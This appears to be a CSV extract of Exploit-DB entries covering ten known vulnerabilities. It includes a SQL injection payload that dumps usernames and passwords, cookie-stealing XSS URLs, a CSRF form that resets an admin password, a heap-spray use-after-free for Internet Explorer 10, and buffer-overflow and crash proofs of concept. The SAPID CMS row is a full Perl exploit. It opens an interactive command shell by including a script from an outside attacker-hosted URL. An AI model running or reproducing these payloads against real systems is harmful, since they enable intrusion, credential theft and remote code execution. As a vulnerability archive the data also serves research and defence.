18352,"Advanced Image Hosting Script - SQL Injection # Exploit Title: AIHS (Advanced Image Hosting Script) SQL Injection Vulnerability # Author: Robert Cooper ( Robert.Cooper [at] areyousecure.net ) # Software Link: http://yabsoft.com/ # Tested on: [Linux/Windows 7]  #Vulnerable File:   view_comments.php  #Vulnerable parameter:  view_comments.php?gal=[gallery id]    ############################################################## PoC:   www.example.com/view_comments.php?gal=109 union all select 1,2,3,4,5,6,7,group_concat(id,0x3a,user,0x3a,pass,0x0a) FROM users--   ##############################################################  www.areyousecure.net  www.websiteauditing.org    # Shouts to the Belegit crew",Advanced Image Hosting Script,1
38791,"Audacious 3.7 - ID3 Local Crash (PoC) # Exploit Title: Audacious 3.7 ID3 Local Crash PoC # Date: 11-20-2015 # Exploit Author: Antonio Z. # Vendor Homepage: http://audacious-media-player.org/ # Software Link: http://audacious-media-player.org/download | http://distfiles.audacious-media-player.org/audacious-3.7-win32.zip # Version: 3.7 # Tested on: Windows 7 SP1 x64, Windows 8.1 x64, Windows 10 x64, Debian 8.2 x86-x64 # Comment: Issue was reported: http://redmine.audacious-media-player.org/issues/595  require 'fileutils' require 'mp3info'  evil = 'A' * 1048576  FileUtils.cp 'Test_Case.mp3', 'Test_Case_PoC.mp3'  Mp3Info.open('Test_Case_PoC.mp3') do |mp3|   mp3.tag.artist = evil end",Audacious,1
33708,"FreeBSD 8.0 / OpenBSD 4.x - 'ftpd' Null Pointer Dereference Denial of Service // source: https://www.securityfocus.com/bid/38559/info  The FreeBSD and OpenBSD 'ftpd' service is prone to a denial-of-service vulnerability because of a NULL-pointer dereference.  Successful exploits may allow remote attackers to cause denial-of-service conditions. Given the nature of this issue, attackers may also be able to run arbitrary code, but this has not been confirmed.  This issue affects the following releases:  FreeBSD 8.0, 6.3, 4.9 OpenBSD 4.5 and 4.6   #include <glob.h> #include <stdio.h>  #define MAXUSRARGS      100 #define MAXGLOBARGS     1000  void do_glob() {         glob_t gl;         char **pop;          char buffer[256];         strcpy(buffer, ""{A*/../A*/../A*/../A*/../A*/../A*/../A*}"");          int flags = GLOB_BRACE|GLOB_NOCHECK|GLOB_TILDE;         memset(&gl, 0, sizeof(gl));         gl.gl_matchc = MAXGLOBARGS;         flags |= GLOB_LIMIT;         if (glob(buffer, flags, NULL, &gl)) {                 printf(""GLOB FAILED!\n"");                 return 0;         }         else //                for (pop = gl.gl_pathv; pop && *pop && 1 < (MAXGLOBARGS-1);                 for (pop = gl.gl_pathv; *pop && 1 < (MAXGLOBARGS-1);                      pop++) {                         printf(""glob success"");                         return 0;                 }         globfree(&gl); }  main(int argc, char **argv) {         do_glob();         do_glob(); }",FreeBSD,1
2161,"SAPID CMS 1.2.3_rc3 - 'rootpath' Remote Code Execution ######################################################################### # Title: SAPID CMS Multiple remote Command Execution Vulnerabilities # # Author: Simo64 <simo64_at_morx_org> #  # Discovered: 06 Aout 2006 #  # Published : 08 Aout 2006 #  # MorX Security Research Team #  # http://www.morx.org #  # Vendor : SAPID CMS # # Version : 123 rc3 () #  # Website : http://sapid.sourceforge.net #  # Severity: Critical #  # Details:  #  #  # [+] Remote File Inclusion #  # 1) vulnerable code in usr/extensions/get_infochannel.inc.php lines( 8 - 9 ) #  # if(!defined(""common_extfunctions"")) { define(""common_extfunctions"", ""loaded""); # include($root_path.""usr/system/common_extfunctions.inc.php""); } # # 2) vulnerable code in usr/extensions/get_tree.inc.php lines( 9 - 10 ) # # if(!defined(""common_extfunctions"")) { define(""common_extfunctions"", ""loaded""); # include($GLOBALS[""root_path""].""usr/system/common_extfunctions.inc.php""); } # # $root_path , $GLOBALS[""root_path""] variable are not sanitized ,before it can be used to include files #  # [-] Exploit :  #  # http://localhost/usr/extensions/get_infochannel.inc.php?root_path=http://attacker/cmd.txt?cmd=id;pwd #  # http://localhost/usr/extensions/get_tree.inc.php?GLOBALS[""root_path""]=http://attacker/cmd.txt?cmd=id;pwd # #====================================== # Poc Remote Command Execution Exploit: #====================================== # # http://www.morx.org/sapid.txt # # C:\>perl sapid.pl http://127.0.0.1 # # =============================================================== # =  SAPID 123_rc3 (rootpath) Remote Command Execution Exploit  = # =============================================================== # =       MorX Security Research Team - www.morx.org            = # =       Coded by Simo64 - simo64@www.morx.org                 = # ===============================================================  # simo64@morx.org :~$ id; ls # uid=48(apache) gid=48(apache) groups=48(apache) # get_calendar.inc.php # get_filter_list.inc.php # get_gb_records.inc.php # get_infochannelfilter.inc.php # get_infochannel.inc.php # get_rss.inc.php # get_searchresults.inc.php # get_survey.inc.php # get_track.inc.php # get_tree.inc.php # soap_call.inc.php # simo64@morx.org :~$ exit  # Enjoy ! # #!/usr/bin/perl   use LWP::Simple;  print ""\n===============================================================\n""; print ""=  SAPID 123_rc3 (rootpath) Remote Command Execution Exploit  =\n""; print ""===============================================================\n""; print ""=       MorX Security Research Team - www.morx.org            =\n""; print ""=       Coded by Simo64 - simo64\@www.morx.org                 =\n"";  print ""===============================================================\n\n"";  my $targ,$rsh,$path,$con,$cmd,$data,$getit ;  $targ = $ARGV[0]; $rsh  = $ARGV[1];  if(!$ARGV[1]) {$rsh = ""http://zerostag.free.fr/sh.txt"";}  if(!@ARGV) { &usage;exit(0);}  	$targ = $ARGV[0]; 	  	 	chomp($targ);     chomp($rsh);      	$path = $targ.""/usr/extensions/get_infochannel.inc.php""; 	$con  = get($path) || die ""[-]Cannot connect to Host"";   sub usage(){ 	print ""Usage    : perl $0 host/path [OPTION]\n\n""; 	print ""Exemples : perl $0 http://127.0.0.1\n""; 	print ""           perl $0 http://127.0.0.1 http://yoursite/yourcmd.txt\n\n""; 	}  while ()   {   	 print ""simo64\@morx.org :~\$ ""; 	 chomp($cmd=<STDIN>);      if ($cmd eq ""exit"") { print ""\nEnjoy !\n\n"";exit(0);}      $getit = $path.""?root_path="".$rsh.""?&cmd="".$cmd;      $data=get($getit);      if($cmd eq """"){ print ""Please enter command !\n""; }      else{ print $data ;} }  # milw0rm.com [2006-08-10]",SAPID CMS,1
36883,Webglimpse 2.x - Multiple Cross-Site Scripting Vulnerabilities source: https://www.securityfocus.com/bid/52170/info  Webglimpse is prone to multiple cross-site scripting vulnerabilities because it fails to sufficiently sanitize user-supplied data.  Exploiting these issues could allow an attacker to execute arbitrary script on the affected server and steal cookie-based authentication credentials. Other attacks are also possible.  Webglimpse versions 2.18.8 and prior are affected.   http://www.example.com/wgarcmin.cgi?URL2FIL=URL+2+File+--%3E&URL=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E&NEXTPAGE=T  http://www.example.com/wgarcmin.cgi?FIL2URL=%3C--+File+2+URL&FILE=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E&NEXTPAGE=T  http://www.example.com/wgarcmin.cgi?DOMAIN=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E&NEXTPAGE=T,Webglimpse,1
14372,"Haihaisoft PDF Reader OCX Control 1.1.2.0 - Remote Buffer Overflow (PoC) -----BEGIN PGP SIGNED MESSAGE----- Hash: SHA1  ================================================================================== ==================================================================================  Haihaisoft PDF Reader OCX Control Remote Buffer Overflow  url: http://www.haihaisoft.com/ ================================================================================== ==================================================================================  Author: shinnai  mail: shinnai[at]autistici[dot]org  site: http://www.shinnai.altervista.org/   This was written for educational purpose. Use it at your own risk.  Author will be not responsible for any damage.   Tested on:  Windows XP Professional SP3 full patched, Internet Explorer 8  Windows 2k Professional SP4 full patched, Internet Explorer 6 ================================================================================== ==================================================================================  File name:	PDFReaderOCX.ocx  Version:	1.1.2.0  ProgID:	PDFReaderOCX.PDFReaderOCXCtrl.1  GUID:		{28CB49D6-E530-442B-A182-79F047C3AA1B}  Descr.:	PDFReaderOCX Control    Marked as:	RegKey Safe for Script: True 		RegKey Safe for Init: True 		Implements IObjectSafety: False ================================================================================== ==================================================================================  This control contains 19 members, as follow:   Members: 19 	    URL 	    Language 	    UnicodeURL 	    ZoomOutput 	    ViewOutput 	    View_ContinuousOutput 	    UpdateURL 	    DownloadURL 	    m_ViewDir 	    RequiredVersion 	    Zoom 	    View 	    Rotate 	    GoTo 	    Open 	    Close 	    UILanguage 	    Print 	    DRMRights   Particularly this one ""URL"" results vulnerable to a buffer overflow if you  pass an overly long string (more than 2048 bytes) as filename and browse to  the crafted web page (e.g. http://www.SomeSite.com/File.pdf) and then  refresh the page. ================================================================================== ==================================================================================  Proof of concept:   <object classid='clsid:28CB49D6-E530-442B-A182-79F047C3AA1B' id='test'></object>   <script language=""vbscript"">   buff = ""AAAAAAAAAAAAAAABBBB"" + String(2011, ""C"")   test.URL = buff    Function tryMe()    document.location.reload   End Function    Sub Window_OnLoad    setTimeout ""tryMe()"",2000   End Sub  </script> ================================================================================== ==================================================================================  Registers:   17:07:08.406  pid=0410 tid=02DC  EXCEPTION (first-chance)                ----------------------------------------------------------------                Exception C0000005 (ACCESS_VIOLATION reading [42424242])                ----------------------------------------------------------------                EAX=0275CD80: 20 82 75 02 78 5E 75 02-41 41 41 41 41 41 41 41                EBX=0275B978: CC 09 6B 02 00 00 00 00-00 00 00 00 98 B4 75 02                ECX=02755E78: 80 CD 75 02 C0 BA 75 02-00 00 00 00 58 64 3D 02                EDX=42424242: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??                ESP=0297C5B0: 9F 9D 28 02 F0 A1 75 02-C4 C5 97 02 25 5C 29 02                EBP=0297FFB4: EC FF 97 02 BC B3 6B 79-78 5E 75 02 80 DF 12 00                ESI=0275BAC0: 78 5E 75 02 78 01 75 02-00 08 00 00 00 00 00 00                EDI=0275A1F0: BC 09 6B 02 00 00 00 00-00 00 00 00 0C A2 75 02                EIP=42424242: ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??                              --> N/A                ---------------------------------------------------------------- ================================================================================== ==================================================================================  -----BEGIN PGP SIGNATURE----- Version: GnuPG v1.4.10 (MingW32)  iQIcBAEBAgAGBQJMQDW4AAoJELleC2c7YdP1cg4P/jD0oq/osKQYYt1xfXCei9Ag rkSyP9D91IwiTW5VQqnEfeDDBRsHAa7Y2xm7O7ZK5tkj1cTKnijyiSOHBum/V94v oA9UGWJDzk2ztjHlUvHA2zrF9uxFxGQRxI+TgJlS9PgGvw3BYDT0ZwemniRY6wtS PMbxiDRKGESPG6xCDCP1XLWUqdEUmlNchkzG1s6dqEbTfYmPcJTP/ffWS7glcJya 3eDoXIGqESBHMtRUKr8JFlEeI/ZpfZ83g5EiomP0KQoQreBBbdx1mER0EpCfgNuo uBUwnZtkD5LA9kFL0mrnG4SC6KEw7s2gWKXwiXesZ8JI8Fuy/nvGy2na+yksTd/h PQpMwtvR8eX1A3z4BZUV4OhgJB8oweAyI0TJUBi3F8VgDDGGDVcrR57HU8gX3S8T Ft5j/xbO2qqCGb9hlgAhV1fQAa+HxXKtrPLp2arsnFCkLU4RINyH3TKK07pT3GSG 009qBpYL//hvV7pwv+pvYfrcZSrDf1yyU3cirVjSAkG23CdicHw7+woj9LgTMNR6 e4wys8kziNfCUVcfseTGWGAVKELxZyJvNhKz8Y6pXg7oSuz41bhf+uozjl/beBPz jOKy6mfUCW2PogRvVOj8j/zkiseDtM3UjMazYuaBUmO8DNl8gpLFL007MN5dbLHM QAGnwRHZypdNlz79bX/+ =kM0M -----END PGP SIGNATURE-----",Haihaisoft PDF Reader OCX Control,1
32851,"Microsoft Internet Explorer 10 - CMarkup Use-After-Free (MS14-012) <!--  MS14-012 Internet Explorer CMarkup Use-After-Free  Vendor Homepage: http://www.microsoft.com  Version: IE 10  Date: 2014-03-31   Exploit Author: Jean-Jamil Khalife  Tested on: Windows 7 SP1 x64 (fr, en)  Flash versions tested: Adobe Flash Player (12.0.0.70, 12.0.0.77)  Home: http://www.hdwsec.fr  Blog : http://www.hdwsec.fr/blog/  MS14-012 / CVE-2014-0322   Generation:  	c:\mxmlc\bin>mxmlc.exe AsXploit.as -o AsXploit.swf   Exploit-DB Mirror:  https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/32851-AsXploit.as  -->  <html> <head> </head> <body>  <script>  var g_arr = []; var arrLen = 0x250;  function dword2data(dword) { 	var d = Number(dword).toString(16); 	while (d.length < 8) 		d = '0' + d;  	return unescape('%u' + d.substr(4, 8) + '%u' + d.substr(0, 4)); }  function eXpl() {     var a=0;      for (a=0; a < arrLen; a++) {         g_arr[a] = document.createElement('div');     } 	 	// Build a new object 	var b = dword2data(0x19fffff3);     while (b.length < 0x360) 	{ 		// mov     eax,dword ptr [esi+98h] 		// ... 		// mov     eax,dword ptr [eax+8] 		// and     dword ptr [eax+2F0h],0FFFFFFBFh 		if (b.length == (0x98 / 2)) 		{ 			b += dword2data(0x1a000010); 		} 		// mov     ecx,dword ptr [edx+94h] 		// mov     eax,dword ptr [ecx+0Ch] 		else if (b.length == (0x94 / 2)) 		{ 			b += dword2data(0x1a111111); 		} 		// mov     eax,dword ptr [edx+15Ch] 		// mov     ecx,dword ptr [eax+edx*8] 		else if (b.length == (0x15c / 2)) 		{ 			b += dword2data(0x42424242); 		} 		else 		{ 			b += dword2data(0x19fffff3); 		} 	}      	var d = b.substring(0, ( 0x340 - 2 )/2);      	// trigger 	try{         this.outerHTML=this.outerHTML     }  	catch(e){ 		 	} 	     CollectGarbage();  	// Replace freed object     for (a=0; a < arrLen; a++)     {         g_arr[a].title = d.substring(0, d.length);     } }  // Trigger the vulnerability function trigger() {     var a = document.getElementsByTagName(""script"");     var b = a[0];     b.onpropertychange = eXpl;     var c = document.createElement('SELECT');     c = b.appendChild(c); }    </script> <embed src=AsXploit.swf width=""10"" height=""10""></embed> </body> </html>",Microsoft Internet Explorer,1
37553,"eNdonesia - 'cid' SQL Injection source: https://www.securityfocus.com/bid/54741/info  eNdonesia is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.  A successful exploit may allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.  eNdonesia 8.5 is vulnerable; other versions may also be affected.   http://www.example.com/eNdonesia/mod.php?mod=diskusi&op=viewcat&cid=-[id][SQL INJECTION]",eNdonesia,1
14096,"CMSQLite / CMySQLite 1.3 - Cross-Site Request Forgery # Title: CMSQlite & CMySQLite CSRF Vulnerability # Author: ADEO Security # Published: 28/06/2010 # Version: v1.3 >= # Vendor: http://www.cmsqlite.net  # Description: ""CMSQLite is a small, fast, flexible and complete Content-Management-System (CMS).  # It's perfect for freelancers, self-employeds, clubs and associations and small companies.  # CMSQLite is a CMS, basing on PHP and SQLite. That has many advantages!""  # Credit: Vulnerability founded by Canberk BOLAT at ADEO Security Labs (security@adeo.com.tr)  # Vulnerability: CMSQlite and CMySQLite have CSRF vulnerabilites in the admin panel. # Attacker can change the password of the admin. For secure your web applications against  # CSRF vulnerabilities, look at this resources: * OWASP-TR/WGT anticsurf Project - http://code.google.com/p/anticsurf/ * CSRF Prevention CS - http://www.owasp.org/index.php/Cross-Site_Request_Forgery_%28CSRF%29_Prevention_Cheat_Sheet  # PoC: <html> <body> <form action=""http://server/admin/helper/updateUser.php\"" method=""POST""> <input type=""hidden"" name=""userId"" value=""1""> <input type=""hidden"" name=""userUsername"" value=""admin""> <input type=""hidden"" name=""password1"" value=""csrfhits""> <input type=""hidden"" name=""password2"" value=""csrfhits""> </form>  </body> </html>",CMySQLite,1
37919,"Microsoft Windows - 'win32k.sys' TTF Font Processing IUP[] Program Instruction Pool-Based Buffer Overflow Source: https://code.google.com/p/google-security-research/issues/detail?id=368&can=1  We have encountered a number of Windows kernel crashes in the win32k!itrp_IUP function (a handler of the IUP[] TTF program instruction) while processing corrupted TTF font files, such as:  --- PAGE_FAULT_IN_NONPAGED_AREA (50) Invalid system memory was referenced.  This cannot be protected by try-except, it must be protected by a Probe.  Typically the address is just plain bad or it is pointing at freed memory. Arguments: Arg1: ff6895b8, memory referenced. Arg2: 00000001, value 0 = read operation, 1 = write operation. Arg3: 91f4a4f1, If non-zero, the instruction address which referenced the bad memory 	address. Arg4: 00000000, (reserved)  [...]  FAULTING_IP:  win32k!itrp_IUP+2fb 91f4a4f1 8904b2          mov     dword ptr [edx+esi*4],eax  MM_INTERNAL_CODE:  0  DEFAULT_BUCKET_ID:  VISTA_DRIVER_FAULT  BUGCHECK_STR:  0x50  PROCESS_NAME:  csrss.exe  CURRENT_IRQL:  0  LAST_CONTROL_TRANSFER:  from 91f4bc79 to 91f4a4f1  STACK_TEXT:   8adcf3b8 91f4bc79 00000001 91f517d3 00000000 win32k!itrp_IUP+0x2fb 8adcf3c0 91f517d3 00000000 ff64eb28 00b61838 win32k!itrp_InnerExecute+0x38 8adcf3f8 91f4bc79 ff64eb28 91f4f088 ff64ebbc win32k!itrp_CALL+0x23b 8adcf400 91f4f088 ff64ebbc ff64eb84 ff64f95c win32k!itrp_InnerExecute+0x38 8adcf480 91f53234 00b61804 00b61838 ff64eb28 win32k!itrp_Execute+0x2b2 8adcf4a8 91f529dc 00b61804 00b61838 ff64eb28 win32k!itrp_ExecuteGlyphPgm+0x4a 8adcf4dc 91f51e5e ff64a570 00000001 00000000 win32k!fsg_SimpleInnerGridFit+0x102 8adcf574 91f5238c ff64a250 ff64b73c ff64eb28 win32k!fsg_ExecuteGlyph+0x1ce 8adcf5d0 91f52202 ff64a250 ff64eb28 ff64b6b4 win32k!fsg_CreateGlyphData+0xea 8adcf610 91f4f419 ff64a250 ff64eb28 ff64a2c4 win32k!fsg_GridFit+0x4d 8adcf688 91f5906c 00000001 8adcf6a4 91f58fc3 win32k!fs__Contour+0x287 8adcf694 91f58fc3 ff64a010 ff64a07c 8adcf6c0 win32k!fs_ContourGridFit+0x12 8adcf6a4 91f5991f ff64a010 ff64a07c 00000027 win32k!fs_NewContourGridFit+0x10 8adcf6c0 91f59960 fb8b0e78 00000027 8adcf6fc win32k!bGetGlyphOutline+0xd7 8adcf6e8 91f59b59 fb8b0e78 00000027 00000001 win32k!bGetGlyphMetrics+0x20 8adcf82c 91f4ec63 fb8b0e78 00000027 8adcf918 win32k!lGetGlyphBitmap+0x2b 8adcf850 91f4eab6 00000000 00000001 00000027 win32k!ttfdQueryFontData+0x158 8adcf8a0 91f4dce2 ff7af010 fba32cf0 00000001 win32k!ttfdSemQueryFontData+0x45 8adcf8e8 91f53774 ff7af010 fba32cf0 00000001 win32k!PDEVOBJ::QueryFontData+0x3e 8adcf960 91fcbc8d 8adcfc3c fb87ec00 ff6470cc win32k!xInsertMetricsPlusRFONTOBJ+0x120 8adcf990 91f4594d 0000000a ff7bf000 8adcfcd0 win32k!RFONTOBJ::bGetGlyphMetricsPlus+0x179 8adcf9c8 91fcb78b 8adcfc1c 8adcfc3c 00000008 win32k!ESTROBJ::vCharPos_H3+0xf0 8adcfa0c 91f455d0 8adcfcd0 0000000a 8adcfc1c win32k!ESTROBJ::vInit+0x268 8adcfc2c 91f45793 00000000 8adcfcd0 fba32cf0 win32k!GreGetTextExtentExW+0x12a 8adcfd0c 82657896 0801016f 02d90bac 0000000a win32k!NtGdiGetTextExtentExW+0x141 8adcfd0c 77b370f4 0801016f 02d90bac 0000000a nt!KiSystemServicePostCall WARNING: Frame IP not in any known module. Following frames may be wrong. 0021f6c4 00000000 00000000 00000000 00000000 0x77b370f4 ---  Depending on the malformed font file, the crashes occur at various locations in the win32k!itrp_IUP function, such as:  win32k!itrp_IUP+141: test    [esi+edx], cl win32k!itrp_IUP+173: test    [eax+edx], cl win32k!itrp_IUP+17b: mov     eax, [ecx+ebx*4] win32k!itrp_IUP+184: mov     ecx, [ecx] win32k!itrp_IUP+213: mov     eax, [ebx] win32k!itrp_IUP+2c9: mov     eax, [eax+esi*4] win32k!itrp_IUP+2fb: mov     [edx+esi*4], eax win32k!itrp_IUP+317: add     [eax+esi*4], edx  This is caused by the fact that the function operates (reads from and writes to) on memory well beyond of the dynamically allocated buffers, leading to a pool-based buffer overflow of controlled size and content, consequently allowing for remote code execution in the context of the Windows kernel.  It appears that the culprit of the vulnerability is the lack of handling of a corner case explicitly mentioned in the ""The TrueType Instruction Set, Part 2"" specification [1]:  ""This instruction operates on points in the glyph zone pointed to by zp2. This zone should almost always be zone 1. Applying IUP to zone 0 is an error.""  Every testcase we have examined contains an SZP2[] instruction (""Set Zone Pointer 2"") with a 0 argument followed by the IUP[] instruction later on in the TTF program. The faulty instruction stream has the same outcome regardless of its location (i.e. font pre-program, glyph program etc.).  The issue reproduces on Windows 7 and 8.1. It is easiest to reproduce with Special Pools enabled for win32k.sys (leading to an immediate crash when the bug is triggered), but it is also possible to observe a crash on a default Windows installation in the form of a crash in win32k!itrp_IUP or another location in kernel space, as caused by the corrupted pool state, depending on the specific testcase used.  Attached is an archive with eight sample files, each crashing at a different location in the win32k!itrp_IUP function on Windows 7 32-bit, together with corresponding kernel crash logs.  Proof of Concept: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/37919.zip",Microsoft Windows,1
